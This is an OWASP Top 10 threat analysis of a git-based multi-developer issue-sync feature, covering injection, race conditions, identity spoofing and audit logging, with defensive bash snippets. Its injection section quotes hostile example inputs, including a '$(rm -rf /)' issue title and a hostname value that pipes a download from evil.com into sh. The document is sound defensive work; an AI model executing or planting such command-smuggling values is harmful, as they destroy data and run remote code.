# OWASP Top 10 (2021) Analysis: Multi-Developer Session Awareness

**Feature scope**: `bd sync` push/pull of `.beads/issues.jsonl` and `.beads/file-index.jsonl` to a shared git branch, `conflict-detect.sh` bash script for cross-referencing in-progress issues across developers, session identity as `gituser@hostname`, auto-detection of sync branch from `git remote show origin`, soft blocks at `/plan` and `/dev` entry gates when module overlap is detected.

**Date**: 2026-03-22
**Analyst**: Security Audit (DevSecOps)
**Related**: See also `2026-03-21-issue-sync-owasp-analysis.md` (GitHub Actions sync — different attack surface)

---

## A01: Broken Access Control

**Applies**: YES — HIGH RELEVANCE

**Risk**: Any developer with git push access to the sync branch can modify `.beads/issues.jsonl` directly, altering another developer's issue assignments, status, priorities, or closing their issues. Since beads data is a flat JSONL file tracked in git, there is no server-side access control layer — the "database" is a shared text file.

**Specific attack vectors**:
1. **Assignee spoofing**: Developer A edits the JSONL to reassign Developer B's in-progress issue to themselves, or changes the `owner` field to claim credit.
2. **Issue tampering**: A developer modifies another developer's issue description, acceptance criteria, or notes to alter the historical record.
3. **Silent status manipulation**: Closing or reopening another developer's issues via direct JSONL edit, bypassing any workflow gates.
4. **Priority escalation**: Changing `priority` on someone else's issue to deprioritize it relative to their own work.

**Mitigations**:
1. **Git commit signing (GPG/SSH)**: Require signed commits on the sync branch so every JSONL modification has a cryptographically verified author. Add verification in `conflict-detect.sh`:
   ```bash
   # Verify last sync commit is signed
   git log -1 --format='%G?' -- .beads/issues.jsonl | grep -qE '^[GU]' || \
     echo "WARNING: Unsigned beads sync commit detected" >&2
   ```
2. **Diff-based ownership validation**: Before accepting a `bd sync` pull, parse the incoming diff and reject changes to issues where `owner` does not match the commit author. Implement as a pre-merge hook.
3. **Append-only sync model**: Instead of full-file replacement, use an append-only event log (`issue-events.jsonl`) where each event records `{actor, timestamp, action, issue_id, delta}`. Tampering with historical events is detectable via hash chains.
4. **Git blame audit**: `conflict-detect.sh` should use `git log` on `.beads/issues.jsonl` to verify each issue line was last modified by its owner. Flag discrepancies as warnings.

**Severity**: MEDIUM — mitigated by git's built-in attribution (commits show who changed what), but not enforced programmatically.

---

## A02: Cryptographic Failures

**Applies**: LOW RELEVANCE

**Risk**: Session identity is `gituser@hostname` — this is not a cryptographic credential but a plain-text identifier. No secrets are stored in beads data files. However:

1. **No integrity verification**: The JSONL files have no checksums or signatures. A corrupted file (disk error, partial write during sync) is silently accepted.
2. **Hostname as identity**: Hostnames are trivially spoofable. If two developers share a machine or use generic hostnames (common Windows defaults like `DESKTOP-ABC123`), identity collisions occur.

**Mitigations**:
1. **SHA-256 checksum file**: After each `bd sync` write, generate `.beads/issues.jsonl.sha256`. Verify on pull before applying:
   ```bash
   sha256sum .beads/issues.jsonl > .beads/issues.jsonl.sha256
   ```
2. **Use `git config user.email` as primary identity** instead of hostname. Email is already configured per-developer in git config and is more unique than hostname.
3. **Git commit signatures** (same as A01) provide cryptographic proof of authorship.

**Severity**: LOW — no secrets at risk, but integrity validation is missing.

---

## A03: Injection

**Applies**: YES — HIGH RELEVANCE

**Risk**: The `conflict-detect.sh` script reads developer names, hostnames, file paths, and issue titles from JSONL data and uses them in shell operations. The existing codebase has a strong `sanitize()` function (verified in `dep-guard.sh` lines 69-83, `beads-context.sh` lines 40-54, `smart-status.sh` lines 27-40) that strips `$(...)`, backticks, semicolons, and double quotes. However, `conflict-detect.sh` is a NEW script that must adopt these same patterns.

**Specific attack vectors**:
1. **Malicious issue title**: A developer creates an issue titled `` test $(rm -rf /) `` — if the title is interpolated into a shell command without sanitization, arbitrary code executes. Evidence this is realistic: issue `forge-04t` in the existing `.beads/issues.jsonl` already contains `echo PWNED2  rm -rf /` in its notes field (from the prior OWASP analysis).
2. **Hostile hostname in session identity**: If `gituser@hostname` is constructed from `$(hostname)` output and a system has hostname set to ``; curl evil.com/payload | sh``, unquoted usage enables injection.
3. **File paths with special characters**: `.beads/file-index.jsonl` contains file paths. Paths with spaces, newlines, or shell metacharacters (`$`, backticks, `|`, `&`) can break `grep`, `diff`, or `git` commands if not properly quoted.
4. **JSONL field injection**: If `jq` output is interpolated into shell strings without quoting, fields containing `\n`, `\t`, or shell metacharacters can escape their context.

**Mitigations**:
1. **MANDATORY: Reuse the existing `sanitize()` function** from `dep-guard.sh`. Do not write a new one — import or copy the proven implementation:
   ```bash
   # From dep-guard.sh lines 69-83 — strips $(...), backticks, semicolons, quotes, newlines
   sanitize() {
     local val="$1"
     val="${val//\"/}"
     val="$(printf '%s' "$val" | sed -e ':loop' -e 's/\$([^()]*)//g' -e 't loop')"
     val="${val//\`/}"
     val="${val//;/}"
     val="$(printf '%s' "$val" | tr '\n' ' ')"
     printf '%s' "$val"
   }
   ```
2. **Quote ALL variable expansions**: Every `$variable` must be in double quotes. The existing scripts demonstrate this consistently — zero unquoted variable references in command positions across all three audited scripts.
3. **Use `--` separator for git commands**: `smart-status.sh` line 324 already does this:
   ```bash
   "$GIT" diff "${BASE_BRANCH}...${_branch}" --name-only -- 2>/dev/null
   ```
   The `--` prevents file paths from being interpreted as flags. `conflict-detect.sh` MUST follow this pattern for every git command that accepts file path arguments.
4. **Use `jq -r` for JSON extraction, never `eval` or unquoted interpolation**: All three existing scripts use `jq` safely (never `eval`). `conflict-detect.sh` must follow the same pattern.
5. **Validate session identity format**: Before using `gituser@hostname`, validate it matches a safe character set:
   ```bash
   validate_session_id() {
     local id="$1"
     if ! printf '%s' "$id" | grep -qE '^[a-zA-Z0-9._@+-]+$'; then
       die "Invalid session identity: contains unsafe characters"
     fi
   }
   ```
6. **Use `printf '%s'` not `echo`**: The existing scripts consistently use `printf '%s'` to avoid `echo` interpretation of escape sequences. `conflict-detect.sh` must do the same.

**Severity**: HIGH if sanitization is omitted; LOW if existing patterns are followed. The codebase has strong precedent — the risk is regression in the new script.

---

## A04: Insecure Design

**Applies**: YES — HIGH RELEVANCE

**Risk**: Concurrent `bd sync` operations and the TOCTOU (time-of-check-time-of-use) gap in conflict detection create fundamental design-level vulnerabilities.

**Specific attack vectors**:
1. **Race condition in `bd sync`**: Two developers run `bd sync` simultaneously. Both read the same `.beads/issues.jsonl`, both make changes, both push. The second push either fails (if git rejects non-fast-forward) or silently overwrites the first developer's changes (if auto-merge succeeds but produces a semantically incorrect merge of JSONL lines).
2. **TOCTOU in conflict detection**: `conflict-detect.sh` reads `file-index.jsonl` to check for overlaps, then the developer proceeds to `/plan` or `/dev`. Between the check and the actual work starting, another developer could claim the same files. The "soft block" is advisory only.
   ```
   T=0: Developer A runs conflict-detect.sh -> no conflicts
   T=1: Developer B runs bd sync, claims same files
   T=2: Developer A starts /dev, unaware of B's claim
   ```
3. **JSONL merge semantics**: Git treats JSONL as a text file. A standard git merge of two JSONL files that both modified the same issue line will produce a merge conflict, but if different lines were modified, git merges them cleanly — even if the changes are semantically contradictory (e.g., A closes issue X while B adds tasks to issue X).
4. **Stale file-index**: `file-index.jsonl` is only updated during `bd sync`. A developer's file index could be hours old, making the conflict detection unreliable.

**Mitigations**:
1. **Atomic sync with lock file**: Use a lightweight lock mechanism:
   ```bash
   LOCK_BRANCH="beads-sync-lock"
   # Try to create lock branch (atomic in git)
   git branch "$LOCK_BRANCH" HEAD 2>/dev/null || \
     die "Sync in progress by another developer — retry in 30s"
   trap 'git branch -D "$LOCK_BRANCH" 2>/dev/null' EXIT
   # ... perform sync ...
   git branch -D "$LOCK_BRANCH"
   ```
2. **Issue-level last-modified check**: Before writing an issue back, compare `updated_at` timestamp with the version that was read. Reject if the remote version is newer (optimistic concurrency control).
3. **Re-validate at gate entry**: The `/plan` and `/dev` entry gates should re-run conflict detection at the moment of entry, not rely on a cached result. This narrows (but does not eliminate) the TOCTOU window.
4. **JSONL merge strategy**: Configure `.gitattributes` to use `merge=union` for JSONL files (append both sides) rather than standard merge, then run a deduplication pass:
   ```gitattributes
   .beads/issues.jsonl merge=union
   .beads/file-index.jsonl merge=union
   ```
5. **Freshness window**: `conflict-detect.sh` should refuse to operate on `file-index.jsonl` data older than N minutes (configurable, default 5):
   ```bash
   INDEX_AGE=$(( $(date +%s) - $(stat -c %Y .beads/file-index.jsonl 2>/dev/null || echo 0) ))
   if [ "$INDEX_AGE" -gt 300 ]; then
     echo "WARNING: File index is ${INDEX_AGE}s old. Run 'bd sync' first." >&2
   fi
   ```

**Severity**: HIGH — race conditions can cause silent data loss. The JSONL-in-git model has inherent concurrency limitations.

---

## A05: Security Misconfiguration

**Applies**: MODERATE RELEVANCE

**Risk**: Auto-detection of sync branch from `git remote show origin` could target the wrong branch, and default git configurations may not protect beads data.

**Specific vectors**:
1. **Wrong sync branch**: If `git remote show origin` returns an unexpected default branch (e.g., a developer's fork has `main` but the team uses `develop`), beads data syncs to the wrong location.
2. **Missing `.gitattributes`**: Without explicit merge strategy configuration, JSONL merges default to line-based text merge, which can corrupt issue data.
3. **Permissive branch protection**: If the sync branch lacks protection rules, any developer can force-push and overwrite beads history.

**Mitigations**:
1. **Explicit sync branch configuration**: Add `sync_branch` to `.beads/config.yaml` instead of auto-detecting:
   ```yaml
   sync:
     branch: master  # Explicit, not auto-detected
     auto_pull: true
     freshness_window_seconds: 300
   ```
2. **Validate branch exists before sync**: `bd sync` should verify the target branch exists locally and remotely before pushing.
3. **Ship `.gitattributes` with merge strategy**: Include in the feature implementation:
   ```gitattributes
   .beads/issues.jsonl merge=union
   .beads/file-index.jsonl merge=union
   ```

**Severity**: LOW-MEDIUM — misconfiguration leads to data going to wrong branch, not direct security breach.

---

## A06: Vulnerable and Outdated Components

**Applies**: LOW RELEVANCE

**Risk**: The feature relies on `bash`, `git`, `jq`, and the `bd` CLI. These are standard system tools unlikely to have exploitable vulnerabilities in this context. However:

1. **`jq` version sensitivity**: Older `jq` versions (< 1.6) have different behavior for `fromdateiso8601` and error handling.
2. **`git merge-tree`**: Used in `smart-status.sh` — requires git >= 2.38. The new feature should document minimum versions.

**Mitigations**:
1. **Document minimum versions**: In the feature documentation:
   ```
   Requirements: git >= 2.38, jq >= 1.6, bash >= 3.2
   ```
2. **Version check at script entry**: Follow `smart-status.sh` lines 398-413 pattern for git version validation.

**Severity**: LOW.

---

## A07: Identification and Authentication Failures

**Applies**: MODERATE RELEVANCE

**Risk**: Session identity (`gituser@hostname`) is not authenticated — it is self-reported. Any developer can configure `git config user.email` to any value, effectively impersonating another developer.

**Specific vectors**:
1. **Identity spoofing**: Developer sets `git config user.email "colleague@company.com"` and claims their issues.
2. **Hostname collision**: Two developers on machines both named `DESKTOP-ABC123` (common with default Windows hostnames) produce the same session identity.
3. **No session revocation**: If a developer leaves the team, their session identity remains in beads data with no way to invalidate it.

**Mitigations**:
1. **Prefer `git config user.email`** over hostname as primary identity — email is more unique and already required by git.
2. **Require GPG/SSH commit signing** for beads sync commits — this provides cryptographic identity verification that cannot be spoofed without the private key.
3. **Session fingerprint**: Combine multiple signals for a more unique identity:
   ```bash
   SESSION_ID="$(git config user.email)@$(hostname -s)"
   ```
4. **Warn on identity collision**: `conflict-detect.sh` should detect and warn when two different worktrees share the same session identity.

**Severity**: MEDIUM — impersonation is possible but has limited impact (no privilege escalation, just data attribution).

---

## A08: Software and Data Integrity Failures

**Applies**: YES — MODERATE RELEVANCE

**Risk**: JSONL files pulled via `bd sync` are not validated for structural integrity before being applied. A malformed or maliciously crafted JSONL file could corrupt the local beads database.

**Specific vectors**:
1. **Malformed JSONL**: A truncated sync (network failure mid-pull) leaves `issues.jsonl` with a partial last line. The `bd` daemon imports this and corrupts SQLite (`beads.db` is 2.7MB per current state).
2. **Schema violation**: A developer using a different beads version writes JSONL with fields the local version does not expect, causing parse failures.
3. **Excessive data injection**: A malicious JSONL line with a multi-megabyte `description` field could cause memory exhaustion in `jq` or the `bd` daemon.

**Mitigations**:
1. **JSONL line validation before import**: Validate each line is valid JSON before importing:
   ```bash
   while IFS= read -r line; do
     printf '%s' "$line" | jq empty 2>/dev/null || {
       echo "WARNING: Skipping malformed JSONL line" >&2
       continue
     }
   done < .beads/issues.jsonl
   ```
2. **Field size limits**: Reject JSONL lines where any single field exceeds a threshold (e.g., 64KB per line).
3. **Backup before sync**: Before applying pulled changes, copy current state:
   ```bash
   cp .beads/issues.jsonl ".beads/issues.jsonl.bak.$(date +%s)"
   ```
4. **Schema version header**: Add a version field to JSONL metadata so version mismatches are detected early.

**Severity**: MEDIUM — data corruption is the primary risk, not code execution.

---

## A09: Security Logging and Monitoring Failures

**Applies**: YES — HIGH RELEVANCE

**Risk**: Currently there is no audit trail for who claimed what issue, when file-index entries were modified, or when conflict detection was overridden. The existing `beads-context.sh` records stage transitions via `bd comments add` (line 265), but there is no equivalent for sync operations or conflict overrides.

**Specific gaps**:
1. **No sync log**: When `bd sync` pushes/pulls, there is no record of what changed, who initiated it, or whether conflicts were resolved.
2. **No conflict override audit**: When a developer overrides a soft block at `/plan` or `/dev` entry, there is no record that they were warned and proceeded anyway.
3. **No file-index change tracking**: When `file-index.jsonl` changes, there is no record of which developer claimed which files.
4. **No anomaly detection**: No mechanism to detect unusual patterns (e.g., a developer claiming 50 files, or frequent reassignment of issues).

**Mitigations**:
1. **Sync event log**: Create `.beads/sync-log.jsonl` (append-only) recording every sync operation:
   ```json
   {"timestamp":"2026-03-22T10:00:00Z","actor":"dev@host","action":"push","issues_changed":["forge-abc"],"files_changed":3}
   {"timestamp":"2026-03-22T10:05:00Z","actor":"dev2@host2","action":"pull","conflicts_detected":1,"conflicts_overridden":0}
   ```
2. **Conflict override recording**: When a developer proceeds past a soft block, record it via `bd comments add`:
   ```bash
   bd comments add "$ISSUE_ID" \
     "CONFLICT_OVERRIDE: Proceeded despite overlap with $CONFLICTING_ISSUE on files: $OVERLAP_FILES"
   ```
3. **File claim history**: Each `file-index.jsonl` entry should include a `claimed_at` timestamp and `claimed_by` field, creating an audit trail.
4. **Git-native audit**: Since everything is in git, `git log --follow .beads/issues.jsonl` provides a natural audit trail. Document this as the primary audit mechanism and ensure sync commits have descriptive messages:
   ```bash
   git commit -m "beads-sync: ${ACTOR} pushed ${CHANGE_COUNT} issue changes"
   ```

**Severity**: MEDIUM-HIGH — lack of audit trail makes it impossible to investigate disputes or detect tampering after the fact.

---

## A10: Server-Side Request Forgery (SSRF)

**Applies**: NO

**Risk**: This feature does not make HTTP requests, connect to external services, or process URLs from user input. All operations are local git and file operations. `git remote show origin` reads from git config, not from user-supplied URLs at runtime.

**Mitigations**: None required.

**Severity**: NOT APPLICABLE.

---

## Summary Matrix

| OWASP ID | Category | Applies | Severity | Key Mitigation |
|----------|----------|---------|----------|----------------|
| A01 | Broken Access Control | YES | MEDIUM | Diff-based ownership validation, commit signing |
| A02 | Cryptographic Failures | LOW | LOW | SHA-256 checksums, use email over hostname |
| A03 | Injection | YES | HIGH* | Reuse `sanitize()`, quote all vars, validate session ID format |
| A04 | Insecure Design | YES | HIGH | Optimistic concurrency, re-validate at gates, freshness window |
| A05 | Security Misconfiguration | MODERATE | LOW-MEDIUM | Explicit sync branch config, `.gitattributes` merge strategy |
| A06 | Vulnerable Components | LOW | LOW | Document minimum tool versions |
| A07 | Identification Failures | MODERATE | MEDIUM | Prefer email identity, require commit signing |
| A08 | Data Integrity Failures | MODERATE | MEDIUM | JSONL validation, backup before sync, field size limits |
| A09 | Logging Failures | YES | MEDIUM-HIGH | Sync event log, conflict override recording, descriptive commits |
| A10 | SSRF | NO | N/A | Not applicable |

*A03 severity is HIGH if sanitization is omitted, LOW if existing patterns are followed.

---

## Recommended Implementation Order

| Priority | OWASP | Action | Effort | Blocks |
|----------|-------|--------|--------|--------|
| 1 | A03 | Copy `sanitize()` into `conflict-detect.sh`, validate session ID format | Low | Prevents code execution |
| 2 | A04 | Implement freshness window and re-validate at gate entry | Medium | Prevents silent data loss from TOCTOU |
| 3 | A09 | Add `sync-log.jsonl` and conflict override recording | Medium | Enables auditability |
| 4 | A01 | Diff-based ownership validation on sync pull | Medium | Prevents cross-developer tampering |
| 5 | A08 | JSONL validation and backup-before-sync | Low | Prevents data corruption |
| 6 | A04 | Optimistic concurrency control via `updated_at` | High | Prevents race condition data loss |
| 7 | A07 | Use email as primary identity, document signing | Low | Reduces impersonation risk |
| 8 | A05 | Explicit sync branch config, `.gitattributes` | Low | Prevents misconfiguration |
| 9 | A02 | SHA-256 checksums for JSONL files | Low | Adds integrity verification |
| 10 | A06 | Document minimum tool versions | Low | Compatibility |

---

## Existing Codebase Security Patterns to Preserve

The current scripts establish strong security patterns that `conflict-detect.sh` MUST follow:

| Pattern | Source File | Lines | Description |
|---------|------------|-------|-------------|
| `sanitize()` | `dep-guard.sh` | 69-83 | Strips `$(...)`, backticks, semicolons, quotes, newlines |
| `set -euo pipefail` | All three scripts | Line 1 | Fail on error, unset vars, pipe failures |
| `printf '%s'` over `echo` | All three scripts | Throughout | Prevents escape sequence interpretation |
| `--` separator in git commands | `smart-status.sh` | 324 | Prevents argument injection via file paths |
| `jq` for JSON parsing (never `eval`) | All three scripts | Throughout | Safe structured data extraction |
| Double-quoted variable expansions | All three scripts | Throughout | Prevents word splitting and globbing |
| `die()` for error exits | All three scripts | Early lines | Consistent error handling |
| OWASP A03 comment header | All three scripts | Header block | Documents security intent |
| `bd_update()` wrapper with output validation | `dep-guard.sh`, `beads-context.sh` | 87-106 / 58-77 | Catches silent failures from `bd` CLI |

---

## Comparison with GitHub Actions Sync Analysis

The prior analysis (`2026-03-21-issue-sync-owasp-analysis.md`) covers a different attack surface: GitHub Actions workflows triggered by issue events. Key differences:

| Aspect | GitHub Actions Sync | Multi-Dev Session Awareness |
|--------|--------------------|-----------------------------|
| Trust boundary | GitHub users (public) | Git contributors (team) |
| Execution context | GitHub-hosted runner | Developer local machine |
| Primary A03 vector | `${{ }}` interpolation in `run:` blocks | Shell variable expansion in bash scripts |
| Primary A04 vector | Concurrent workflow runs | Concurrent `bd sync` + TOCTOU at gates |
| Primary A01 vector | Any issue opener triggers write | Any git pusher can modify JSONL |
| SSRF relevance | Low (GitHub API only) | None |

Both analyses share the same JSONL integrity concerns (A08) and logging gaps (A09).
